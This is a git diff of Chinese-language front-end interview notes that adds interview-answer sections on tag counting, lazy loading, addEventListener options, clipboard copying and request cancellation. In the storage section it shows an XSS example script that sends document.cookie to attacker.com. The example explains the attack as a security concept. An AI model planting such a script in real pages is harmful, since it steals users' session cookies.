@@ -1,4 +1,5 @@
 ## 目录
+
 - [目录](#目录)
 - [link标签有什么作用](#link标签有什么作用)
   - [相关资料](#相关资料)
@@ -8,40 +9,51 @@
   - [面试回答](#面试回答-1)
 - [统计当前页面出现次数最多的标签](#统计当前页面出现次数最多的标签)
   - [相关代码](#相关代码)
+  - [面试回答](#面试回答-2)
 - [如何找到当前页面出现次数前三多的 HTML 标签 最小堆](#如何找到当前页面出现次数前三多的-html-标签-最小堆)
   - [相关代码](#相关代码-1)
+  - [面试回答](#面试回答-3)
 - [跨域](#跨域)
   - [相关资料](#相关资料-2)
-  - [面试回答](#面试回答-2)
+  - [面试回答](#面试回答-4)
 - [图片懒加载](#图片懒加载)
   - [相关资料](#相关资料-3)
+  - [面试回答](#面试回答-5)
 - [cookie、sessionStorage与localStorage有何区别](#cookiesessionstorage与localstorage有何区别)
   - [相关资料](#相关资料-4)
-  - [面试回答](#面试回答-3)
+  - [面试回答](#面试回答-6)
 - [浏览器中监听事件函数 addEventListener 第三个参数有那些值](#浏览器中监听事件函数-addeventlistener-第三个参数有那些值)
+  - [相关资料](#相关资料-5)
+  - [面试回答](#面试回答-7)
 - [什么是事件委托，e.currentTarget 与 e.target 有何区别](#什么是事件委托ecurrenttarget-与-etarget-有何区别)
 - [DOM 中如何阻止事件默认行为，如何判断事件否可阻止？](#dom-中如何阻止事件默认行为如何判断事件否可阻止)
-- [在浏览器中如何获取剪切板中内容](#在浏览器中如何获取剪切板中内容)
-- [浏览器的剪切板中如何监听复制事件](#浏览器的剪切板中如何监听复制事件)
+- [在复制内容到剪切板中](#在复制内容到剪切板中)
+  - [相关资料](#相关资料-6)
+  - [面试回答](#面试回答-8)
 - [如何实现页面文本不可复制](#如何实现页面文本不可复制)
 - [如何取消请求的发送](#如何取消请求的发送)
-- [如何理解 JS 的异步？](#如何理解-js-的异步)
-  - [相关资料](#相关资料-5)
-  - [面试回答](#面试回答-4)
-- [阐述一下 JS 的事件循环](#阐述一下-js-的事件循环)
-  - [面试回答](#面试回答-5)
-- [JS 中的计时器能做到精确计时吗？为什么？](#js-中的计时器能做到精确计时吗为什么)
-  - [相关资料](#相关资料-6)
-  - [面试回答](#面试回答-6)
-- [从输入一个URL到渲染完成，浏览器做了什么？](#从输入一个url到渲染完成浏览器做了什么)
   - [相关资料](#相关资料-7)
-  - [面试回答](#面试回答-7)
+  - [面试回答](#面试回答-9)
+- [如何理解 JS 的异步？](#如何理解-js-的异步)
+  - [相关资料](#相关资料-8)
+  - [面试回答](#面试回答-10)
+- [阐述一下 JS 的事件循环](#阐述一下-js-的事件循环)
+  - [面试回答](#面试回答-11)
+- [JS 中的计时器能做到精确计时吗？为什么？](#js-中的计时器能做到精确计时吗为什么)
+  - [相关资料](#相关资料-9)
+  - [面试回答](#面试回答-12)
+- [从输入一个URL到渲染完成，浏览器做了什么？](#从输入一个url到渲染完成浏览器做了什么)
+  - [相关资料](#相关资料-10)
+  - [面试回答](#面试回答-13)
 - [什么事reflow](#什么事reflow)
 - [什么是 repaint？](#什么是-repaint)
 - [为什么 transform 的效率高？](#为什么-transform-的效率高)
 - [异步加载 JS 脚本时，async 与 defer 有何区别](#异步加载-js-脚本时async-与-defer-有何区别)
+  - [相关资料](#相关资料-11)
+  - [面试回答](#面试回答-14)
 - [Vue 中的 router 实现原理如何](#vue-中的-router-实现原理如何)
 - [浏览器中如何读取二进制信息](#浏览器中如何读取二进制信息)
+
 
 
 ## link标签有什么作用
@@ -236,6 +248,12 @@ getMostTag()
 
 ```
 
+### 面试回答
+
+1. 通过`document.querySelectorAll("*")`获取当前页所有的标签
+2. 遍历标签key为tagName,value是出现次数，存放到一个map对象中
+3. 遍历map找到出现次数最多的标签
+
 ## 如何找到当前页面出现次数前三多的 HTML 标签 最小堆
 
 ### 相关代码
@@ -268,6 +286,12 @@ const getTopThreeTag=()=>{
 }
 getTopThreeTag()
 ```
+
+### 面试回答
+
+1. 通过`document.querySelectorAll("*")`获取当前页所有的标签
+2. 遍历标签key为tagName,value是出现次数，存放到一个map对象中
+3. 遍历map，维持一个最大3个的最小堆
 
 ## 跨域
 
@@ -355,6 +379,13 @@ vant 图片懒加载原理
 
 [流程图](https://excalidraw.com/#json=39ahva7amaS1d2lqYMC0v,3QBiVpqeHBItdme6RD6zvA)
 
+### 面试回答
+
+vant 懒加载是基于 [vue-lazyload 官方文档](https://github.com/hilongjw/vue-lazyload)的，是面向对象的设计理念，整个懒加载功能是由一个LazyClass类管理的，在初始化的时候根据环境判断是使用IntersectionObserver观察者模式还是滚动监听模式来实现懒加载
+
+1. 设置v-lazy指令，在元素的beforeMount时候调用LazyClass的add方法，该方法会获取标准化的src值，并同时开始监听滚动，如果是ntersectionObserver观察者模式就调用API监听，如果是滚动监听模式就递归查找离元素最近的滚动的父元素开始监听，并且为每一个元素设置一个listener实例，该实例是为了维护每个元素的懒加载loading状态和缓存
+2. 遍历listeners，判断元素是否出现在视口内，如果有，则调用listener的load方法，new 一个image对象，然后加载src，在onload回调中设置元素的src，这么做的目的是避免布局抖动、处理异常、利于缓存、控制并发量
+
 ## cookie、sessionStorage与localStorage有何区别
 
 ### 相关资料
@@ -397,7 +428,7 @@ localStorage、sessionStorage：这两者都是使用`键与值(key-value)` 的�
    1. 注入恶意脚本
       攻击者通过存在XSS漏洞的输入点（如评论框、URL参数、文件上传）注入恶意JavaScript代码
 
-   ```
+   ```html
    <script>
      fetch('https://attacker.com/steal?cookie=' + document.cookie);
    </script>
@@ -432,12 +463,16 @@ cookie 、localStorage 和 sessionStorage3中都是前端常用的存储方式�
 
 ## 浏览器中监听事件函数 [addEventListener](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener) 第三个参数有那些值
 
-1. passive
-2. capture
-3. once
-4. signal
+### 相关资料
 
 [addEventListener](https://developer.mozilla.org/zh-CN/docs/Web/API/EventTarget/addEventListener)
+
+### 面试回答
+
+1. passive 设置为 `true` 时，表示 `listener` 永远不会调用 `preventDefault()`。如果 listener 仍然调用了这个函数，客户端将会忽略它并抛出一个控制台警告。**允许浏览器在事件监听器执行过程中并行处理默认滚动行为**，从而减少滚动延迟和卡顿
+2. capture 该类型的事件捕获阶段触发
+3. once 表示 `listener` 在添加之后最多只调用一次，如果为 `true`，`listener` 会在其被调用之后自动移除。
+4. signal [`AbortSignal`](https://developer.mozilla.org/zh-CN/docs/Web/API/AbortSignal)，该 `AbortSignal` 的 [`abort()`](https://developer.mozilla.org/zh-CN/docs/Web/API/AbortController/abort) 方法被调用时，监听器会被移除。兼容性不好
 
 ## 什么是事件委托，e.currentTarget 与 e.target 有何区别
 
@@ -455,7 +490,9 @@ cookie 、localStorage 和 sessionStorage3中都是前端常用的存储方式�
 
 如果 `addEventListener` 第三个参数 `{ passive: true}`，`preventDefault` 将会会无效
 
-## 在浏览器中如何获取剪切板中内容
+## 在复制内容到剪切板中
+
+### 相关资料
 
 1. Document.execCommand()方法
 
@@ -506,36 +543,22 @@ const text = await navigator.clipboard.readText();
 
 [[剪贴板操作](https://www.ruanyifeng.com/blog/2021/01/clipboard-api.html)](https://www.ruanyifeng.com/blog/2021/01/clipboard-api.html)
 
-## 浏览器的剪切板中如何监听复制事件
+### 面试回答
 
-用户向剪贴板放入数据时，将触发`copy`事件。
+1. 调用input的select()方法选中，然后执行Document.execCommand('copy')方法
 
-```javascript
-const clipboardItems = [];
+   缺点
 
-document.addEventListener('copy', async (e) => {
-  e.preventDefault();
-  try {
-    let clipboardItems = [];
-    for (const item of e.clipboardData.items) {
-      if (!item.type.startsWith('image/')) {
-        continue;
-      }
-      clipboardItems.push(
-        new ClipboardItem({
-          [item.type]: item,
-        })
-      );
-      await navigator.clipboard.write(clipboardItems);
-      console.log('Image copied.');
-    }
-  } catch (err) {
-    console.error(err.name, err.message);
-  }
-});
-```
+   - 只能将选中的内容复制到剪贴板，无法向剪贴板任意写入内容。
+   - 其次，它是同步操作，如果复制/粘贴大量数据，页面会出现卡顿。有些浏览器还会跳出提示框，要求用户许可，这时在用户做出选择前，页面会失去响应。
+   - 在PC端，可以复制文件和图片，但在移动端，无法复制图片
 
+2. clipboard.writeText(text);
 
+   缺点
+
+   - 兼容性：如果navigator.clipboard属性返回undefined，就说明当前浏览器不支持这个 API。
+   - 只有 HTTPS 协议的页面才能使用这个 API。不过，开发环境（localhost）允许使用非加密协议。
 
 ## 如何实现页面文本不可复制
 
@@ -562,6 +585,8 @@ document.body.oncopy = e => {
 ```
 
 ## 如何取消请求的发送
+
+### 相关资料
 
 1. XHR 使用 `xhr.abort()`
 
@@ -592,7 +617,19 @@ document.body.oncopy = e => {
    2. 在请求拦截时，先从全局的map查找有没有匹配的key,如果命中，则中断上一个请求，移除map映射，然后为当前请求生成key和AbortController实例，收集到map中
    3. 在响应拦截时，从map中移除相关请求
 
-   
+### 面试回答
+
+1. XMLHttpRequest实例调用abort方法
+
+2. AbortController 实例调用abort方法，并且在header中传入实例的signal属性
+
+   可以利用取消请求的功能封装axios,让其支持取消重复请求的功能
+
+   具体实现原理：
+
+   1. 设置全局的map,key是请求的唯一标识,可以根据URL+methods+data生成，value是每次请求新建的AbortController实例
+   2. 在请求拦截时，先从全局的map查找有没有匹配的key,如果命中，则中断上一个请求，移除map映射，然后为当前请求生成key和AbortController实例，收集到map中
+   3. 在响应拦截时，从map中移除相关请求
 
 ## 如何理解 JS 的异步？
 
@@ -785,11 +822,15 @@ repaint 的本质就是重新根据分层信息计算了绘制指令。
 
 ## 异步加载 JS 脚本时，async 与 defer 有何区别
 
+### 相关资料
+
 [[一张图看懂async和defer区别](https://gist.github.com/jakub-g/385ee6b41085303a53ad92c7c8afd7a6)](https://gist.github.com/jakub-g/385ee6b41085303a53ad92c7c8afd7a6)
 
 ![async-defer](https://html.spec.whatwg.org/images/asyncdefer.svg)
 
-而 `defer` 与 `async` 的区别如下:
+### 面试回答
+
+ `defer` 与 `async` 的区别如下:
 
 - 相同点: **异步加载 (fetch)**
 - 不同点:
